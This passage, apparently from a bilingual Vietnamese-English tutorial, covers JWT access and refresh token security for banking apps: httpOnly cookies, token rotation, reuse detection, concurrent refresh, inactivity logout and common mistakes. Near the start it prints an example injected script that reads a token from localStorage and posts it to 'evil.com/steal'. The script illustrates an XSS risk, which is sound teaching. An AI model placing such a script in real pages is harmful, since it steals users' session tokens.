// - 🤖 Auto gửi với requests (convenient - browser tự động attach)
// - ⏱️ Long-lived (30 ngày) nhưng secure (httpOnly protection)
// - 🛡️ SameSite=Strict chống CSRF (không gửi cross-site)

// ❌ ⚠️ NEVER LÀM NHƯ NÀY (NGUY HIỂM!):
localStorage.setItem('accessToken', token);  // ❌ XSS đọc được qua localStorage.getItem()
sessionStorage.setItem('accessToken', token);  // ❌ Vẫn XSS risk (JS đọc được)
document.cookie = `accessToken=${token}`;  // ❌ Readable by JS (không httpOnly)

// ============================================
// 🚨 XSS Attack Example (Ví dụ tấn công XSS)
// ============================================

// 💀 Scenario 1: Nếu lưu token trong localStorage
// Hacker inject malicious script vào website (qua comment, form input, etc.):
<script>
  // 💀 Đánh cắp token từ localStorage
  const token = localStorage.getItem('accessToken');  // ✅ Thành công!
  
  // 📡 Gửi token về hacker server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token }),  // 📦 Gửi token đi
  });
  
  // 💀 Giờ hacker có token → impersonate user (giả mạo)
  // → Truy cập account, chuyển tiền, đọc dữ liệu nhạy cảm!
</script>

// ✅ Scenario 2: Nếu dùng httpOnly cookie
// Hacker inject cùng script:
<script>
  // 💀 Thử đánh cắp cookie
  const token = document.cookie; // ❌ undefined (httpOnly - JS không đọc được)
  
  // ❌ Không lấy được! ✅ An toàn!
  // Browser chặn truy cập httpOnly cookies từ JavaScript
</script>
```

**C. Token Rotation (Xoay Vòng Token - Advanced Security):**

```typescript
// ============================================
// 🔄 REFRESH TOKEN ROTATION (Mỗi lần refresh → token mới)
// ============================================

// 🔧 Backend: Mỗi lần refresh → generate token mới và revoke token cũ
app.post('/auth/refresh', async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;  // 🍪 Lấy token cũ
  
  // 🔹 Verify old token (kiểm tra hợp lệ)
  const decoded = jwt.verify(oldRefreshToken, SECRET);
  // → decoded = { jti: "old-token-id", sub: "user123", ... }
  
  // 🔹 Generate NEW Access Token (15 phút mới)
  const newAccessToken = jwt.sign({ ... }, SECRET, { expiresIn: '15m' });
  
  // 🔹 Generate NEW Refresh Token (rotation - token mới hoàn toàn)
  const newRefreshToken = jwt.sign(
    { 
      jti: uuidv4(),  // 🆔 JWT ID MỚI (khác với old token)
      sub: decoded.sub  // 👤 Giữ nguyên User ID
    },
    SECRET,
    { expiresIn: '30d' }  // ⌛ 30 ngày mới
  );
  
  // 🔹 Revoke old Refresh Token (blacklist token cũ)
  await db.revokeRefreshToken(decoded.jti);  // 🗄️ Set isRevoked = true
  // → Old token không thể dùng lại được
  
  // 🔹 Save new Refresh Token vào database
  await db.saveRefreshToken({
    tokenId: newRefreshToken.jti,  // 🆔 Token ID mới
    userId: decoded.sub,
    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
    // ... device info, IP, etc.
  });
  
  // 🔹 Set new Refresh Token cookie (ghi đè cookie cũ)
  res.cookie('refreshToken', newRefreshToken, { 
    httpOnly: true, 
    secure: true,
    sameSite: 'strict',
    maxAge: 30 * 24 * 60 * 60 * 1000,
    path: '/auth/refresh',
  });
  
  // 🔹 Return new Access Token về client
  res.json({ accessToken: newAccessToken });  // ✅ Token mới hoàn toàn
});

// 📊 Lợi ích của Token Rotation:
// ✅ 🔄 Mỗi lần refresh → token mới (old token bị vô hiệu hóa)
// ✅ 🗄️ Old token bị revoke → không dùng lại được (single-use)
// ✅ 💀 Nếu hacker có old token → useless (không dùng được)
// ✅ 🚨 Detect reuse attack: Nếu token revoked mà vẫn dùng → suspicious activity
//   → Server log warning, lock account, send email alert
// ✅ 🔒 Giảm thời gian hữu dụng của stolen token (chỉ dùng được 1 lần)

// 🚨 Reuse Attack Detection:
// Nếu server nhận được token đã revoke:
if (tokenRecord.isRevoked) {
  // 🚨 ALERT: Token bị dùng lại sau khi revoke!
  // → Có thể là attacker đang dùng stolen token
  
  await alertSecurityTeam({  // 📧 Gửi email alert
    type: 'TOKEN_REUSE_DETECTED',
    userId: tokenRecord.userId,
    tokenId: tokenRecord.tokenId,
  });
  
  await lockUserAccount(tokenRecord.userId);  // 🔒 Khóa account tạm thời
  
  return res.status(403).json({ 
    error: 'Token reuse detected',  // ❌ Forbidden
    message: 'Account locked for security. Please contact support.'
  });
}
```

---

#### **🔒 4. Special Cases (Các Trường Hợp Đặc Biệt)**

**A. Concurrent Requests (Nhiều Request Cùng Lúc):**

```typescript
// ============================================
// 🚨 Problem: Race Condition (Nhiều requests cùng lúc)
// ============================================

// 📋 Scenario: User vừa mở 10 tabs, mỗi tab gọi API
// → 10 requests cùng lúc (parallel)
// → Token hết hạn (expired)
// → 10 refresh requests cùng lúc ❌ (wasteful, inefficient)
// → 10 access tokens mới (nhưng chỉ cần 1!)

// ============================================
// ✅ Solution: Request Queue với Promise (Chỉ 1 refresh request)
// ============================================

let refreshPromise: Promise<string> | null = null;  // 🔄 Shared promise

async function getValidToken(): Promise<string> {
  // 🔹 Check 1: Nếu token còn hiệu lực → return luôn
  if (accessToken && !isTokenExpired(accessToken)) {
    return accessToken;  // ✅ Dùng token hiện tại
  }
  
  // 🔹 Check 2: Nếu đang refresh → chờ promise hiện tại
  if (refreshPromise) {  // 🔄 Có refresh request đang chạy
    return await refreshPromise;  // ⏳ Chờ kết quả (không tạo request mới)
    // → 9 requests còn lại sẽ chờ ở đây
  }
  
  // 🔹 Tạo promise mới để refresh (lần đầu tiên)
  refreshPromise = refreshAccessToken().then((newToken) => {
    refreshPromise = null;  // ✅ Reset promise (hooked promise xong)
    return newToken;  // 🔑 Trả về token mới
  });
  
  return await refreshPromise;  // ⏳ Chờ kết quả đầu tiên
}

async function apiCall(url: string) {
  const token = await getValidToken();  // ⏳ Chờ token valid (block cho đến khi có)
  
  return fetch(url, {
    headers: {
      'Authorization': `Bearer ${token}`,  // 🔑 Dùng token mới (shared)
    },
  });
}

// 📊 Kết quả (Optimized):
// ✅ 10 requests đầu tiên trigger getValidToken()
// ✅ Chỉ 1 refresh request thực sự gửi đi (request đầu tiên)
// ✅ 9 requests còn lại chờ promise đó (await refreshPromise)
// ✅ Tất cả dùng chung 1 token mới (efficient, consistent)
// ✅ Giảm tải server (1 request thay vì 10)
```

**B. Inactivity Timeout (Tự Động Logout Khi Không Hoạt Động):**

```typescript
// ============================================
// ⏰ AUTO LOGOUT AFTER INACTIVITY (Banking/Trading YÊu CẦU)
// ============================================

class InactivityTimer {  // 🕒 Class quản lý inactivity
  private timeout: number = 5 * 60 * 1000;  // ⌛ 5 phút không hoạt động = logout
  private timer: NodeJS.Timeout | null = null;  // ⏲️ Timer hiện tại
  
  constructor() {
    this.startTimer();  // 🚀 Bắt đầu đếm thời gian
    this.listenActivity();  // 🎯 Lắng nghe user activities
  }
  
  // 🔹 Bắt đầu đếm ngược
  private startTimer() {
    this.clearTimer();  // 🧹 Xóa timer cũ (nếu có)
    
    this.timer = setTimeout(() => {  // ⏰ Set timer mới (5 phút)
      this.onTimeout();  // 🚪 Gọi logout khi timeout
    }, this.timeout);
  }
  
  // 🔄 Reset timer khi có activity (user thao tác)
  private resetTimer() {
    this.startTimer();  // 🔁 Đếm lại từ đầu (0 -> 5 phút)
  }
  
  // 🎯 Lắng nghe user activity (mouse, keyboard, touch, scroll)
  private listenActivity() {
    const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];  // 📝 Các events quan tâm
    // mousedown: User click chuột
    // keydown: User nhấn phím
    // scroll: User cuộn trang
    // touchstart: User chạm màn hình (mobile)
    
    events.forEach((event) => {
      document.addEventListener(event, () => {  // 🎯 Lắng nghe event
        this.resetTimer();  // 🔄 Reset timer (user đang hoạt động)
      }, { passive: true });  // ⚡ Passive = không block scroll performance
    });
  }
  
  // 🚪 Timeout → logout user
  private onTimeout() {
    console.log('Inactivity timeout - logging out');  // 📝 Log event
    
    // ⚠️ Hiển thị warning dialog
    showWarningDialog('Bạn đã không hoạt động trong 5 phút. Vui lòng đăng nhập lại.');
    
    // Logout
    logout();
  }
  
  private clearTimer() {
    if (this.timer) {
      clearTimeout(this.timer);
      this.timer = null;
    }
  }
}

// Usage:
const inactivityTimer = new InactivityTimer();
```

**C. Device Fingerprinting (Nhận Diện Thiết Bị):**

```typescript
// ============================================
// DEVICE FINGERPRINTING
// ============================================

function getDeviceFingerprint(): string {
  const data = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenResolution: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    colorDepth: screen.colorDepth,
    cpuCores: navigator.hardwareConcurrency,
  };
  
  // Hash fingerprint
  const fingerprint = hashSHA256(JSON.stringify(data));
  return fingerprint;
}

// Backend: Verify device
app.post('/auth/login', async (req, res) => {
  const { deviceId } = req.body;
  const user = await db.findUser(...);
  
  // Check device đã đăng ký chưa
  const knownDevice = await db.findDevice(user.id, deviceId);
  
  if (!knownDevice) {
    // Thiết bị mới → send OTP/email verification
    await sendOTPEmail(user.email);
    
    return res.status(403).json({
      error: 'Unknown device',
      requireOTP: true,
    });
  }
  
  // Device OK → proceed login
  // ...
});
```

**D. Logout All Devices (Đăng Xuất Tất Cả Thiết Bị):**

```typescript
// ============================================
// LOGOUT ALL DEVICES
// ============================================

// Frontend: Trigger logout all
async function logoutAllDevices() {
  await fetch('https://api.bank.com/auth/logout-all', {
    method: 'POST',
    credentials: 'include',
  });
  
  // Redirect to login
  window.location.href = '/login';
}

// Backend: Revoke all refresh tokens
app.post('/auth/logout-all', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  
  // Revoke tất cả refresh tokens của user
  await db.revokeAllRefreshTokens(userId);
  
  // Log event
  await logEvent({
    type: 'LOGOUT_ALL_DEVICES',
    userId,
    timestamp: new Date(),
  });
  
  res.json({ message: 'Logged out from all devices' });
});

// Use case:
// - User nghi ngờ account bị hack
// - Change password → logout all devices
// - Admin revoke access
```

---

#### **⚠️ 5. Common Security Mistakes (Lỗi Bảo Mật Thường Gặp)**

```typescript
// ❌ LỖI 1: Lưu token trong localStorage
localStorage.setItem('accessToken', token);  // XSS risk!

// ✅ ĐÚNG: Lưu trong memory
let accessToken: string | null = null;

// ────────────────────────────────────────

// ❌ LỖI 2: Access Token thời hạn quá dài
jwt.sign(payload, secret, { expiresIn: '30d' });  // Quá lâu!

// ✅ ĐÚNG: 5-15 phút
jwt.sign(payload, secret, { expiresIn: '15m' });

// ────────────────────────────────────────

// ❌ LỖI 3: Không verify token signature
const decoded = jwt.decode(token);  // ❌ Chỉ decode, không verify!

// ✅ ĐÚNG: Verify signature
jwt.verify(token, secret, (err, decoded) => { ... });

// ────────────────────────────────────────

// ❌ LỖI 4: Không revoke refresh token khi logout
// User logout → token vẫn valid → hacker dùng được

// ✅ ĐÚNG: Revoke token vào database blacklist
await db.revokeRefreshToken(tokenId);

// ────────────────────────────────────────

// ❌ LỖI 5: Gửi sensitive data trong token
jwt.sign({
  password: user.password,  // ❌ NEVER!
  creditCard: user.creditCard,  // ❌ NEVER!
}, secret);

// ✅ ĐÚNG: Chỉ non-sensitive data
jwt.sign({
  sub: user.id,
  name: user.name,
  role: user.role,
}, secret);

// ────────────────────────────────────────

// ❌ LỖI 6: Không check token blacklist
// Token bị revoke nhưng vẫn accept

// ✅ ĐÚNG: Check blacklist
const tokenRecord = await db.findRefreshToken(tokenId);
if (!tokenRecord || tokenRecord.isRevoked) {
  return res.status(403).json({ error: 'Token revoked' });
}

// ────────────────────────────────────────

// ❌ LỖI 7: Không rate limit refresh endpoint
// Hacker brute force refresh endpoint

// ✅ ĐÚNG: Rate limit
app.use('/auth/refresh', rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 phút
  max: 10,  // Max 10 requests
}));

// ────────────────────────────────────────

// ❌ LỖI 8: Không log security events
// Không biết khi nào bị attack

// ✅ ĐÚNG: Log everything
await logEvent({
  type: 'LOGIN_FAILED',
  username,
  ipAddress: req.ip,
  reason: 'Invalid password',
  timestamp: new Date(),
});
```

---

#### **📊 6. Complete Flow Diagram**

```
┌────────────────────────────────────────────────────────────────────┐
│           COMPLETE AUTHENTICATION FLOW                             │
│      (Banking/Trading System - Hệ Thống Ngân Hàng)                │
└────────────────────────────────────────────────────────────────────┘

1️⃣ LOGIN
   User                     Frontend                Backend
    │                          │                       │
    │─── Enter credentials ──→│                       │
    │                          │─── POST /login ─────→│
    │                          │    {username, pwd}    │
    │                          │                       │
    │                          │                       │─ Verify credentials
    │                          │                       │─ Generate tokens
    │                          │                       │─ Save refresh token
    │                          │                       │
    │                          │←─ Set-Cookie ────────│
    │                          │   refreshToken        │
    │                          │   (httpOnly)          │
    │                          │                       │
    │                          │←─ { accessToken } ───│
    │←─ Redirect /dashboard ─│                       │
    │                          │                       │
    └─ accessToken in memory  │                       │

2️⃣ API CALL
   User                     Frontend                Backend
    │                          │                       │
    │─── Click "View Balance"→│                       │
    │                          │─ GET /balance ──────→│
    │                          │   Authorization:      │
    │                          │   Bearer <token>      │
    │                          │                       │
    │                          │                       │─ Verify token
    │                          │                       │─ Check permissions
    │                          │                       │
    │                          │←─ { balance: 1M } ───│
    │←─ Display balance ──────│                       │

3️⃣ TOKEN REFRESH (Auto - mỗi 14 phút)
   Frontend                Backend
      │                       │
      │─ POST /auth/refresh →│
      │   Cookie:             │
      │   refreshToken        │
      │                       │
      │                       │─ Verify refresh token
      │                       │─ Check not revoked
      │                       │─ Generate new access token
      │                       │
      │←─ { accessToken } ───│
      │                       │
   Update accessToken         │
   in memory                  │

4️⃣ LOGOUT
   User                     Frontend                Backend
    │                          │                       │
    │─── Click "Logout" ─────→│                       │
    │                          │─ POST /logout ──────→│
    │                          │   Cookie:             │
    │                          │   refreshToken        │
    │                          │                       │
    │                          │                       │─ Revoke token
    │                          │                       │─ Clear cookie
    │                          │                       │
    │                          │←─ { success } ───────│
    │                          │                       │
    │                          │─ accessToken = null   │
    │                          │─ Clear localStorage   │
    │←─ Redirect /login ──────│                       │
```

---

#### **💡 Summary (Tóm Tắt)**

**Access Token 🔑**
- **15 phút**, lưu **memory**, dùng gọi API
- Mất khi refresh page → re-fetch từ refresh token

**Refresh Token 🔄**
- **30 ngày**, lưu **httpOnly cookie**, dùng lấy access token
- Secure: httpOnly + Secure + SameSite=Strict

**Best Practices 🛡️**
- ✅ Never localStorage (XSS risk)
- ✅ httpOnly cookie cho refresh token
- ✅ Short-lived access token (15 phút)
- ✅ Token rotation (refresh → new token)
- ✅ Revoke tokens khi logout
- ✅ Rate limiting
- ✅ Inactivity timeout (5-10 phút)
- ✅ Device fingerprinting
- ✅ Audit logging

**Khi Nào Logout:**
- User click logout ✅
- Inactivity > 5 phút ✅
- Refresh token expired ✅
- Suspicious activity detected ✅
- User change password ✅
- Admin revoke access ✅

**Khi Nào Giữ Session:**
- User đang hoạt động (reset timer)
- Refresh token còn valid
- Device trusted
- No security alerts

**Key Takeaway:**
- **Banking/Trading** yêu cầu bảo mật CỰC CAO
- **2 tokens** (access + refresh) = balance giữa UX và security
- **httpOnly cookie** = chống XSS
- **Short-lived tokens** = giảm impact khi leak
- **Audit logging** = detect suspicious activities
- **Multi-factor** everything (MFA, device fingerprint, inactivity timeout)

